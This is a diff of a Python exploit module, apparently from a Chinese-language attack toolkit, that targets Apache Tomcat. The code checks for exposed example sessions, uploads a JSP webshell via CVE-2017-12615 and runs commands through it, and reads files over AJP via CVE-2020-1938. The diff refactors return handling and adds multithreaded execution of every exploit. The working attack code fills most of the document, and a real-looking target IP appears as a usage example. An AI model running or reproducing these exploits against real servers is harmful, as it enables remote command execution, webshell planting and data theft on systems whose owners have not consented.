@@ -1,11 +1,10 @@
-import random,string,json,re,socket
+import random,string,socket
 import util.globalvar as GlobalVar
-from urllib.parse import urlparse, quote
+from urllib.parse import urlparse
 from util.ExpRequest import ExpRequest,Output
-from operator import methodcaller
 from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
 ################
-##--ApacheSolr--##
+##--ApacheTomcat--##
 #tomcat_examples 实例文件session
 #cve_2017_12615  PUT上传WEBSHELL
 #cve_2020_1938   AJP读取文件
@@ -25,7 +24,6 @@ class ApacheTomcat():
         self.retry_interval = int(env.get('retry_interval'))
         self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
         self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
-        self.status = env.get('status')
 
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
@@ -60,12 +58,12 @@ class ApacheTomcat():
         try:
             request = exprequest.get(self.url+path, timeout=self.timeout, verify=False)
             if request.status_code == 200 and r"Session ID:" in request.text:
-                output.echo_success(method, info)
-                self.status = 'success'
+                return output.echo_success(method, info)
+                
             else:
-                output.fail()
+                return output.fail()
         except Exception as error:
-            output.error_output(str(error))       
+            return output.error_output(str(error))       
                 
     def cve_2017_12615(self):
         appName = 'Apache Tomcat'
@@ -89,19 +87,19 @@ class ApacheTomcat():
                 request = exprequest.get(self.url+path[:-1], timeout=self.timeout, verify=False)
                 if ':-)' in request.text:
                     info = "[upload]"+" [url:"+self.url+"/"+name+".jsp ]"
-                    output.echo_success(method, info)
-                    self.status = 'success'
+                    return output.echo_success(method, info)
+                    
                 else:
-                    output.fail()
+                    return output.fail()
             #_attack
             else:
                 request = exprequest.put(self.url+path, data=payload2, timeout=self.timeout, verify=False)
                 urlcmd = self.url+"/"+name+".jsp?pwd=password&cmd="+self.cmd
                 request = exprequest.get(urlcmd, timeout=self.timeout, verify=False)
                 info = "Put Webshell: "+urlcmd+"\n-------------------------\n"+request.text
-                output.echo_success(method, info)
+                return output.echo_success(method, info)
         except Exception as error:
-            output.error_output(str(error))
+            return output.error_output(str(error))
 
     def cve_2020_1938(self):
         appName = 'Apache Tomcat'
@@ -162,17 +160,17 @@ class ApacheTomcat():
             #return self.snd_hdrs_res, self.data_res
             #print (self.request)
             if 'xml' in request:
-                output.echo_success(method, info)
-                self.status = 'success'
+                return output.echo_success(method, info)
+                
                 print(request)
             else:
-                output.fail()
+                return output.fail()
         except socket.timeout as error:
-            output.timeout_output()
+            return output.timeout_output()
         except NotImplementedError:
-            output.error_output('NotImplementedError')
+            return output.error_output('NotImplementedError')
         except Exception as error:
-            output.error_output(str(error))
+            return output.error_output(str(error))
 
     # Apache Tomcat CVE-2020-1938 "AJP" protocol check def
 def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
@@ -208,19 +206,31 @@ print("""eg: http://49.4.91.247:9001/
 | Apache Tomcat     | cve_2020_1938    |  Y  |  Y  | 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31 arbitrary file read  |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 def check(**kwargs):
+    from concurrent.futures import ThreadPoolExecutor,wait,ALL_COMPLETED
     result_list = []
+    thread_list = []
     result_list.append('----------------------------')
+    #5代表只能开启5个进程, 不加默认使用cpu的进程数
+    pool = ThreadPoolExecutor(int(kwargs['pool_num']))
     ExpApacheTomcat = ApacheTomcat(**kwargs)
     if kwargs['pocname'] != 'ALL':
-        func = getattr(ExpApacheTomcat, kwargs['pocname'])#返回对象函数属性值，可以直接调用
-        func()#调用函数
-        return ExpApacheTomcat.status
-    else:#调用所有函数
+        #返回对象函数属性值，可以直接调用
+        func = getattr(ExpApacheTomcat, kwargs['pocname'])
+        #调用函数
+        return func()
+    #调用所有函数
+    else:
         for func in dir(ApacheTomcat):
-            if not func.startswith("__") and not func.startswith("_"):
-                methodcaller(func)(ExpApacheTomcat)
-                result_list.append(func+' -> '+ExpApacheTomcat.status)
-                ExpApacheTomcat.status = 'fail'
+            if not func.startswith("__"):
+                thread_list.append(pool.submit(getattr(ExpApacheTomcat, func)))
+        #保存全局子线程列表
+        GlobalVar.set_value('thread_list', thread_list)
+        #等待所有多线程任务运行完
+        wait(thread_list, return_when=ALL_COMPLETED)
+        for task in thread_list:
+            #去除取消掉的future任务
+            if task.cancelled() == False:
+                result_list.append(task.result())
     result_list.append('----------------------------')
     return '\n'.join(result_list)
 
